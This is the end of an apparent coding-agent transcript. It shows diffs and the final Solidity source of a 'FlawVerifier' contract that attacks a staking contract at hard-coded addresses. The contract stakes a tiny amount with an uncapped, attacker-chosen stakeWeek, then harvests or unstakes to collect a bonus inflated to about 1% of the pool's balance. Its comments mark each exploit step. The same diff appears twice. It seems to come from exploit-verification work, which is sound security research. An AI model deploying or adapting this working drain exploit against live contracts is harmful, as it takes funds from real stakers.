+        uint256 rewardRate = STAKING.rewardPerSecond();
+        if (rewardRate == 0) {
+            revert RewardEmissionInactive();
+        }
+
+        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, STAKING.JuiceStaked(), rewardRate);
+        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
+            tinyAmount,
+            STAKING.JuiceStaked(),
+            rewardRate,
+            juice.balanceOf(address(STAKING))
+        );
+
+        baselineBalance = verifierHeldJuice;
+        baselineSet = true;
+
+        trackedStakeCount = STAKING.stakingCount(address(this));
+
+        require(juice.approve(address(STAKING), tinyAmount), "approve failed");
+
+        // Path 1: attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
+        // The exploit relies on the vulnerable contract storing the attacker-chosen
+        // hugeStakeWeek without any upper bound or normalization.
+        STAKING.stake(tinyAmount, hugeStakeWeek);
+
+        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
+        stakeOpened = true;
+    }
+
+    function _realizeExploitProfit() internal {
+        uint256 stakeCount = trackedStakeCount;
+
+        (
+            uint256 stakedAmount,
+            ,
+            uint256 endTime,
+            ,
+            ,
+            uint256 unstakeStatus
+        ) = STAKING.mapStakingInfo(address(this), stakeCount);
+
+        if (stakedAmount == 0 || unstakeStatus != 0) {
+            revert StakeAlreadyExited();
+        }
+
+        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
+        if (pending == 0) {
+            // Path 2 requires that some base reward has accrued first. Until then, there is
+            // nothing for the unbounded stakingWeek multiplier to amplify.
+            revert RewardNotAccruedYet(pending, bonus);
+        }
+
+        // Path 3: after nonzero pending accrues, realize the oversized bonus via harvest(stakeCount)
+        // or, if the position has matured, via unstake(stakeCount). Both code paths apply the same
+        // unbounded bonus formula in the target contract.
+        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
+            STAKING.unstake(stakeCount);
+        } else {
+            STAKING.harvest(stakeCount);
+        }
+    }
+
+    function _chooseTinyAmount(
+        uint256 verifierHeldJuice,
+        uint256 currentTotalStaked,
+        uint256 rewardRate
+    ) internal pure returns (uint256 tinyAmount) {
+        if (currentTotalStaked == 0) {
+            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
+        }
+
+        uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+        if (divisor == 0) {
+            return verifierHeldJuice;
+        }
+
+        tinyAmount = currentTotalStaked / divisor;
+        if (currentTotalStaked % divisor != 0) {
+            tinyAmount += 1;
+        }
+
+        if (tinyAmount == 0) {
+            tinyAmount = 1;
+        }
+
+        if (tinyAmount > verifierHeldJuice) {
+            tinyAmount = verifierHeldJuice;
+        }
+    }
+
+    function _chooseHugeStakeWeek(
+        uint256 tinyAmount,
+        uint256 currentTotalStaked,
+        uint256 rewardRate,
+        uint256 poolBalance
+    ) internal pure returns (uint256 hugeStakeWeek) {
+        uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
+        if (expectedPending == 0) {
+            expectedPending = 1;
+        }
+
+        uint256 desiredPayout = poolBalance / PAYOUT_SAFETY_DIVISOR;
+        if (desiredPayout <= expectedPending) {
+            return 2;
+        }
+
+        uint256 bonusTarget = desiredPayout - expectedPending;
+        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
+
+        if (hugeStakeWeek < 2) {
+            hugeStakeWeek = 2;
+        }
+
+        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
+            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
+        }
+    }
+}
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 97325b34a7024badede17a5079c5b9f6eaac6685..f2a53abb5e9b3c83b88de640cc495cfd6dc806e6
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.20;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Minimal {
+     function balanceOf(address account) external view returns (uint256);
+@@ -36,13 +36,13 @@
+ 
+     uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+     uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+-    uint256 internal constant MAX_STAKE_WEEKS = 1e30;
++    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;
+ 
+     uint256 internal baselineBalance;
+-    uint256 internal trackedStakeIndex;
+-    uint256 internal chosenStakeWeeks;
++    uint256 internal trackedStakeCount;
++    uint256 internal trackedStakeEndTime;
+     bool internal baselineSet;
+-    bool internal stakePlaced;
++    bool internal stakeOpened;
+ 
+     error StakingNotStarted(uint256 stakingStartTime);
+     error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+@@ -54,8 +54,8 @@
+     constructor() {}
+ 
+     function executeOnOpportunity() public {
+-        if (!stakePlaced) {
+-            _openExploitPosition(IERC20Minimal(JUICE));
++        if (!stakeOpened) {
++            _openExploitPosition();
+             return;
+         }
+ 
+@@ -79,7 +79,7 @@
+         return currentBalance - baselineBalance;
+     }
+ 
+-    function _openExploitPosition(IERC20Minimal juice) internal {
++    function _openExploitPosition() internal {
+         uint256 stakingStart = STAKING.stakingStartTime();
+         if (stakingStart == 0) {
+             revert StakingNotStarted(stakingStart);
+@@ -90,11 +90,12 @@
+             revert StakingClosed(stakingEnd, block.timestamp);
+         }
+ 
+-        uint256 available = juice.balanceOf(address(this));
+-        if (available == 0) {
+-            // Attempt strategy for this run is direct_or_existing_balance_first.
+-            // This verifier therefore requires pre-existing JUICE on the verifier itself
+-            // unless the harness supplies it through realistic public actions outside this contract.
++        IERC20Minimal juice = IERC20Minimal(JUICE);
++        uint256 verifierHeldJuice = juice.balanceOf(address(this));
++        if (verifierHeldJuice == 0) {
++            // This attempt must prefer direct execution from verifier-held assets.
++            // If the harness wants to fund this verifier, it must do so through realistic
++            // public on-chain transfers outside this contract rather than balance injection.
+             revert NoVerifierHeldJuice();
+         }
+ 
+@@ -103,20 +104,33 @@
+             revert RewardEmissionInactive();
+         }
+ 
+-        uint256 currentStaked = STAKING.JuiceStaked();
+-        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
+-        uint256 poolBalance = juice.balanceOf(address(STAKING));
+-        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);
++        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, STAKING.JuiceStaked(), rewardRate);
++        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
++            tinyAmount,
++            STAKING.JuiceStaked(),
++            rewardRate,
++            juice.balanceOf(address(STAKING))
++        );
+ 
+-        baselineBalance = available;
++        baselineBalance = verifierHeldJuice;
+         baselineSet = true;
+-        trackedStakeIndex = STAKING.stakingCount(address(this));
+-        require(juice.approve(address(STAKING), amount), "approve failed");
+-        STAKING.stake(amount, chosenStakeWeeks);
+-        stakePlaced = true;
++
++        trackedStakeCount = STAKING.stakingCount(address(this));
++
++        require(juice.approve(address(STAKING), tinyAmount), "approve failed");
++
++        // Path 1: attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
++        // The exploit relies on the vulnerable contract storing the attacker-chosen
++        // hugeStakeWeek without any upper bound or normalization.
++        STAKING.stake(tinyAmount, hugeStakeWeek);
++
++        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
++        stakeOpened = true;
+     }
+ 
+     function _realizeExploitProfit() internal {
++        uint256 stakeCount = trackedStakeCount;
++
+         (
+             uint256 stakedAmount,
+             ,
+@@ -124,64 +138,65 @@
+             ,
+             ,
+             uint256 unstakeStatus
+-        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
++        ) = STAKING.mapStakingInfo(address(this), stakeCount);
+ 
+         if (stakedAmount == 0 || unstakeStatus != 0) {
+             revert StakeAlreadyExited();
+         }
+ 
+-        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
++        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
+         if (pending == 0) {
+-            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
+-            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
++            // Path 2 requires that some base reward has accrued first. Until then, there is
++            // nothing for the unbounded stakingWeek multiplier to amplify.
+             revert RewardNotAccruedYet(pending, bonus);
+         }
+ 
+-        if (block.timestamp >= endTime) {
+-            STAKING.unstake(trackedStakeIndex);
++        // Path 3: after nonzero pending accrues, realize the oversized bonus via harvest(stakeCount)
++        // or, if the position has matured, via unstake(stakeCount). Both code paths apply the same
++        // unbounded bonus formula in the target contract.
++        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
++            STAKING.unstake(stakeCount);
+         } else {
+-            STAKING.harvest(trackedStakeIndex);
++            STAKING.harvest(stakeCount);
+         }
+     }
+ 
+-    function _chooseStakeAmount(
+-        uint256 available,
+-        uint256 currentStaked,
++    function _chooseTinyAmount(
++        uint256 verifierHeldJuice,
++        uint256 currentTotalStaked,
+         uint256 rewardRate
+-    ) internal pure returns (uint256) {
+-        if (currentStaked == 0) {
+-            return 1;
++    ) internal pure returns (uint256 tinyAmount) {
++        if (currentTotalStaked == 0) {
++            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
+         }
+ 
+         uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+         if (divisor == 0) {
+-            return available;
++            return verifierHeldJuice;
+         }
+ 
+-        uint256 amount = currentStaked / divisor;
+-        if (currentStaked % divisor != 0) {
+-            amount += 1;
++        tinyAmount = currentTotalStaked / divisor;
++        if (currentTotalStaked % divisor != 0) {
++            tinyAmount += 1;
+         }
+ 
+-        if (amount == 0) {
+-            amount = 1;
++        if (tinyAmount == 0) {
++            tinyAmount = 1;
+         }
+ 
+-        if (amount > available) {
+-            amount = available;
++        if (tinyAmount > verifierHeldJuice) {
++            tinyAmount = verifierHeldJuice;
+         }
+-
+-        return amount;
+     }
+ 
+-    function _chooseStakeWeeks(
+-        uint256 amount,
+-        uint256 currentStaked,
++    function _chooseHugeStakeWeek(
++        uint256 tinyAmount,
++        uint256 currentTotalStaked,
+         uint256 rewardRate,
+         uint256 poolBalance
+-    ) internal pure returns (uint256) {
++    ) internal pure returns (uint256 hugeStakeWeek) {
+         uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+-        expectedPending = (expectedPending * amount) / (currentStaked + amount);
++        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
+         if (expectedPending == 0) {
+             expectedPending = 1;
+         }
+@@ -191,14 +206,15 @@
+             return 2;
+         }
+ 
+-        uint256 bonusBudget = desiredPayout - expectedPending;
+-        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
+-        if (stakeWeeks < 2) {
+-            stakeWeeks = 2;
++        uint256 bonusTarget = desiredPayout - expectedPending;
++        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
++
++        if (hugeStakeWeek < 2) {
++            hugeStakeWeek = 2;
+         }
+-        if (stakeWeeks > MAX_STAKE_WEEKS) {
+-            stakeWeeks = MAX_STAKE_WEEKS;
++
++        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
++            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
+         }
+-        return stakeWeeks;
+     }
+ }
+
+codex
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IJuiceStaking {
+    function Juice() external view returns (address);
+    function JuiceStaked() external view returns (uint256);
+    function rewardPerSecond() external view returns (uint256);
+    function stake(uint256 amount, uint256 stakeWeek) external;
+    function harvest(uint256 stakeCount) external;
+    function unstake(uint256 stakeCount) external;
+    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
+    function stakingStartTime() external view returns (uint256);
+    function stakingEndTime() external view returns (uint256);
+    function stakingCount(address staker) external view returns (uint256);
+    function mapStakingInfo(address staker, uint256 stakeCount)
+        external
+        view
+        returns (
+            uint256 stakedAmount,
+            uint256 startTime,
+            uint256 endTime,
+            uint256 stakingWeek,
+            uint256 rewardDebt,
+            uint256 unstakeStatus
+        );
+}
+
+contract FlawVerifier {
+    IJuiceStaking internal constant STAKING = IJuiceStaking(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
+    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;
+
+    uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+    uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;
+
+    uint256 internal baselineBalance;
+    uint256 internal trackedStakeCount;
+    uint256 internal trackedStakeEndTime;
+    bool internal baselineSet;
+    bool internal stakeOpened;
+
+    error StakingNotStarted(uint256 stakingStartTime);
+    error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+    error NoVerifierHeldJuice();
+    error RewardEmissionInactive();
+    error StakeAlreadyExited();
+    error RewardNotAccruedYet(uint256 pending, uint256 bonus);
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (!stakeOpened) {
+            _openExploitPosition();
+            return;
+        }
+
+        _realizeExploitProfit();
+    }
+
+    function profitToken() external pure returns (address) {
+        return JUICE;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        if (!baselineSet) {
+            return 0;
+        }
+
+        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
+        if (currentBalance <= baselineBalance) {
+            return 0;
+        }
+
+        return currentBalance - baselineBalance;
+    }
+
+    function _openExploitPosition() internal {
+        uint256 stakingStart = STAKING.stakingStartTime();
+        if (stakingStart == 0) {
+            revert StakingNotStarted(stakingStart);
+        }
+
+        uint256 stakingEnd = STAKING.stakingEndTime();
+        if (stakingEnd <= block.timestamp) {
+            revert StakingClosed(stakingEnd, block.timestamp);
+        }
+
+        IERC20Minimal juice = IERC20Minimal(JUICE);
+        uint256 verifierHeldJuice = juice.balanceOf(address(this));
+        if (verifierHeldJuice == 0) {
+            // Attempt strategy is direct_or_existing_balance_first.
+            // This verifier therefore uses only JUICE already held by the verifier unless
+            // the harness supplies funding through realistic public on-chain actions.
+            revert NoVerifierHeldJuice();
+        }
+
+        uint256 currentTotalStaked = STAKING.JuiceStaked();
+        uint256 rewardRate = STAKING.rewardPerSecond();
+        if (rewardRate == 0) {
+            revert RewardEmissionInactive();
+        }
+
+        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, currentTotalStaked, rewardRate);
+        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
+            tinyAmount,
+            currentTotalStaked,
+            rewardRate,
+            juice.balanceOf(address(STAKING))
+        );
+
+        baselineBalance = verifierHeldJuice;
+        baselineSet = true;
+
+        trackedStakeCount = STAKING.stakingCount(address(this));
+
+        require(juice.approve(address(STAKING), tinyAmount), "approve failed");
+
+        // Exploit path step 1:
+        // attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
+        STAKING.stake(tinyAmount, hugeStakeWeek);
+
+        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
+        stakeOpened = true;
+    }
+
+    function _realizeExploitProfit() internal {
+        uint256 stakeCount = trackedStakeCount;
+
+        (
+            uint256 stakedAmount,
+            ,
+            uint256 endTime,
+            ,
+            ,
+            uint256 unstakeStatus
+        ) = STAKING.mapStakingInfo(address(this), stakeCount);
+
+        if (stakedAmount == 0 || unstakeStatus != 0) {
+            revert StakeAlreadyExited();
+        }
+
+        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
+        if (pending == 0) {
+            // Exploit path step 2 requires a nonzero base reward to accrue first.
+            revert RewardNotAccruedYet(pending, bonus);
+        }
+
+        // Exploit path step 3:
+        // realize the inflated bonus through harvest(stakeCount) or unstake(stakeCount),
+        // preserving the same exploit causality as the finding.
+        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
+            STAKING.unstake(stakeCount);
+        } else {
+            STAKING.harvest(stakeCount);
+        }
+    }
+
+    function _chooseTinyAmount(
+        uint256 verifierHeldJuice,
+        uint256 currentTotalStaked,
+        uint256 rewardRate
+    ) internal pure returns (uint256 tinyAmount) {
+        if (currentTotalStaked == 0) {
+            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
+        }
+
+        uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+        if (divisor == 0) {
+            return verifierHeldJuice;
+        }
+
+        tinyAmount = currentTotalStaked / divisor;
+        if (currentTotalStaked % divisor != 0) {
+            tinyAmount += 1;
+        }
+
+        if (tinyAmount == 0) {
+            tinyAmount = 1;
+        }
+
+        if (tinyAmount > verifierHeldJuice) {
+            tinyAmount = verifierHeldJuice;
+        }
+    }
+
+    function _chooseHugeStakeWeek(
+        uint256 tinyAmount,
+        uint256 currentTotalStaked,
+        uint256 rewardRate,
+        uint256 poolBalance
+    ) internal pure returns (uint256 hugeStakeWeek) {
+        uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
+        if (expectedPending == 0) {
+            expectedPending = 1;
+        }
+
+        uint256 desiredPayout = poolBalance / PAYOUT_SAFETY_DIVISOR;
+        if (desiredPayout <= expectedPending) {
+            return 2;
+        }
+
+        uint256 bonusTarget = desiredPayout - expectedPending;
+        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
+
+        if (hugeStakeWeek < 2) {
+            hugeStakeWeek = 2;
+        }
+
+        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
+            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
+        }
+    }
+}
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 97325b34a7024badede17a5079c5b9f6eaac6685..f2a53abb5e9b3c83b88de640cc495cfd6dc806e6
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.20;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Minimal {
+     function balanceOf(address account) external view returns (uint256);
+@@ -36,13 +36,13 @@
+ 
+     uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
+     uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
+-    uint256 internal constant MAX_STAKE_WEEKS = 1e30;
++    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;
+ 
+     uint256 internal baselineBalance;
+-    uint256 internal trackedStakeIndex;
+-    uint256 internal chosenStakeWeeks;
++    uint256 internal trackedStakeCount;
++    uint256 internal trackedStakeEndTime;
+     bool internal baselineSet;
+-    bool internal stakePlaced;
++    bool internal stakeOpened;
+ 
+     error StakingNotStarted(uint256 stakingStartTime);
+     error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
+@@ -54,8 +54,8 @@
+     constructor() {}
+ 
+     function executeOnOpportunity() public {
+-        if (!stakePlaced) {
+-            _openExploitPosition(IERC20Minimal(JUICE));
++        if (!stakeOpened) {
++            _openExploitPosition();
+             return;
+         }
+ 
+@@ -79,7 +79,7 @@
+         return currentBalance - baselineBalance;
+     }
+ 
+-    function _openExploitPosition(IERC20Minimal juice) internal {
++    function _openExploitPosition() internal {
+         uint256 stakingStart = STAKING.stakingStartTime();
+         if (stakingStart == 0) {
+             revert StakingNotStarted(stakingStart);
+@@ -90,11 +90,12 @@
+             revert StakingClosed(stakingEnd, block.timestamp);
+         }
+ 
+-        uint256 available = juice.balanceOf(address(this));
+-        if (available == 0) {
+-            // Attempt strategy for this run is direct_or_existing_balance_first.
+-            // This verifier therefore requires pre-existing JUICE on the verifier itself
+-            // unless the harness supplies it through realistic public actions outside this contract.
++        IERC20Minimal juice = IERC20Minimal(JUICE);
++        uint256 verifierHeldJuice = juice.balanceOf(address(this));
++        if (verifierHeldJuice == 0) {
++            // This attempt must prefer direct execution from verifier-held assets.
++            // If the harness wants to fund this verifier, it must do so through realistic
++            // public on-chain transfers outside this contract rather than balance injection.
+             revert NoVerifierHeldJuice();
+         }
+ 
+@@ -103,20 +104,33 @@
+             revert RewardEmissionInactive();
+         }
+ 
+-        uint256 currentStaked = STAKING.JuiceStaked();
+-        uint256 amount = _chooseStakeAmount(available, currentStaked, rewardRate);
+-        uint256 poolBalance = juice.balanceOf(address(STAKING));
+-        chosenStakeWeeks = _chooseStakeWeeks(amount, currentStaked, rewardRate, poolBalance);
++        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, STAKING.JuiceStaked(), rewardRate);
++        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
++            tinyAmount,
++            STAKING.JuiceStaked(),
++            rewardRate,
++            juice.balanceOf(address(STAKING))
++        );
+ 
+-        baselineBalance = available;
++        baselineBalance = verifierHeldJuice;
+         baselineSet = true;
+-        trackedStakeIndex = STAKING.stakingCount(address(this));
+-        require(juice.approve(address(STAKING), amount), "approve failed");
+-        STAKING.stake(amount, chosenStakeWeeks);
+-        stakePlaced = true;
++
++        trackedStakeCount = STAKING.stakingCount(address(this));
++
++        require(juice.approve(address(STAKING), tinyAmount), "approve failed");
++
++        // Path 1: attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
++        // The exploit relies on the vulnerable contract storing the attacker-chosen
++        // hugeStakeWeek without any upper bound or normalization.
++        STAKING.stake(tinyAmount, hugeStakeWeek);
++
++        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
++        stakeOpened = true;
+     }
+ 
+     function _realizeExploitProfit() internal {
++        uint256 stakeCount = trackedStakeCount;
++
+         (
+             uint256 stakedAmount,
+             ,
+@@ -124,64 +138,65 @@
+             ,
+             ,
+             uint256 unstakeStatus
+-        ) = STAKING.mapStakingInfo(address(this), trackedStakeIndex);
++        ) = STAKING.mapStakingInfo(address(this), stakeCount);
+ 
+         if (stakedAmount == 0 || unstakeStatus != 0) {
+             revert StakeAlreadyExited();
+         }
+ 
+-        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), trackedStakeIndex);
++        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
+         if (pending == 0) {
+-            // The hypothesis requires a later reward accrual after the oversized-week stake is opened.
+-            // If this is still zero, the exploit path has not yet reached the "nonzero base reward accrues" stage.
++            // Path 2 requires that some base reward has accrued first. Until then, there is
++            // nothing for the unbounded stakingWeek multiplier to amplify.
+             revert RewardNotAccruedYet(pending, bonus);
+         }
+ 
+-        if (block.timestamp >= endTime) {
+-            STAKING.unstake(trackedStakeIndex);
++        // Path 3: after nonzero pending accrues, realize the oversized bonus via harvest(stakeCount)
++        // or, if the position has matured, via unstake(stakeCount). Both code paths apply the same
++        // unbounded bonus formula in the target contract.
++        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
++            STAKING.unstake(stakeCount);
+         } else {
+-            STAKING.harvest(trackedStakeIndex);
++            STAKING.harvest(stakeCount);
+         }
+     }
+ 
+-    function _chooseStakeAmount(
+-        uint256 available,
+-        uint256 currentStaked,
++    function _chooseTinyAmount(
++        uint256 verifierHeldJuice,
++        uint256 currentTotalStaked,
+         uint256 rewardRate
+-    ) internal pure returns (uint256) {
+-        if (currentStaked == 0) {
+-            return 1;
++    ) internal pure returns (uint256 tinyAmount) {
++        if (currentTotalStaked == 0) {
++            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
+         }
+ 
+         uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
+         if (divisor == 0) {
+-            return available;
++            return verifierHeldJuice;
+         }
+ 
+-        uint256 amount = currentStaked / divisor;
+-        if (currentStaked % divisor != 0) {
+-            amount += 1;
++        tinyAmount = currentTotalStaked / divisor;
++        if (currentTotalStaked % divisor != 0) {
++            tinyAmount += 1;
+         }
+ 
+-        if (amount == 0) {
+-            amount = 1;
++        if (tinyAmount == 0) {
++            tinyAmount = 1;
+         }
+ 
+-        if (amount > available) {
+-            amount = available;
++        if (tinyAmount > verifierHeldJuice) {
++            tinyAmount = verifierHeldJuice;
+         }
+-
+-        return amount;
+     }
+ 
+-    function _chooseStakeWeeks(
+-        uint256 amount,
+-        uint256 currentStaked,
++    function _chooseHugeStakeWeek(
++        uint256 tinyAmount,
++        uint256 currentTotalStaked,
+         uint256 rewardRate,
+         uint256 poolBalance
+-    ) internal pure returns (uint256) {
++    ) internal pure returns (uint256 hugeStakeWeek) {
+         uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
+-        expectedPending = (expectedPending * amount) / (currentStaked + amount);
++        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
+         if (expectedPending == 0) {
+             expectedPending = 1;
+         }
+@@ -191,14 +206,15 @@
+             return 2;
+         }
+ 
+-        uint256 bonusBudget = desiredPayout - expectedPending;
+-        uint256 stakeWeeks = ((bonusBudget * 100) / (expectedPending * 9)) + 1;
+-        if (stakeWeeks < 2) {
+-            stakeWeeks = 2;
++        uint256 bonusTarget = desiredPayout - expectedPending;
++        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
++
++        if (hugeStakeWeek < 2) {
++            hugeStakeWeek = 2;
+         }
+-        if (stakeWeeks > MAX_STAKE_WEEKS) {
+-            stakeWeeks = MAX_STAKE_WEEKS;
++
++        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
++            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
+         }
+-        return stakeWeeks;
+     }
+ }
+
+tokens used
+18,203
